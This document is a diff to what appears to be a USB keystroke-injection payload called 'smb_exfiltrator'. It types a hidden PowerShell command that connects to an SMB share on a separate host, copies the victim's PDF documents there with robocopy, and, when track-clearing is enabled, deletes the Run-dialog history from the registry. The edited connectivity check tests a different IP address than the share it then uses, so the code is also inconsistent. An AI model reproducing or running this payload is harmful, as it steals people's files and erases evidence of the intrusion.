@@ -19,7 +19,7 @@
 #
 # OPTIONS
 LOOTDIR=/root/udisk/loot/smb_exfiltrator
-EXFILTRATE_FILES="*.pdf"
+FILES="*.pdf" # File types to be exfiltrated
 CLEARTRACKS="yes" # yes or no
 
 # Initialization
@@ -44,7 +44,7 @@ if [ $CLEARTRACKS == "yes" ]; then
    QUACK Delay 500
    QUACK GUI r
    QUACK DELAY 500
-   QUACK STRING PowerShell -W Hidden \"While(!(TNC 172.16.64.1 SMB -I quiet)){};net use \\\172.16.64.1\e PWD /USER:USER;robocopy \$HOME\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S\;rp 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -N '*'"
+   QUACK STRING PowerShell -W Hidden "While(!!(New-Object net.sockets.tcpclient -A 192.168.5.5,445)){};net use \\\172.16.64.1\e PWD /USER:USER;robocopy \$HOME\Documents \\\172.16.64.1\e $FILES /S;rp 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -N '*'"
    QUACK ENTER
 fi
 
@@ -53,7 +53,7 @@ if [ $CLEARTRACKS == "no" ]; then
    QUACK DELAY 500
    QUACK GUI r
    QUACK DELAY 500
-   QUACK STRING PowerShell -W Hidden \"While(!(TNC 172.16.64.1 SMB -I quiet)){};net use \\\172.16.64.1\e PWD /USER:USER;robocopy \$HOME\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S
+   QUACK STRING PowerShell -W Hidden "While(!!(New-Object net.sockets.tcpclient -A 192.168.5.5,445)){};net use \\\172.16.64.1\e PWD /USER:USER;robocopy \$HOME\Documents \\\172.16.64.1\e $FILES /S
    QUACK ENTER
 fi
 
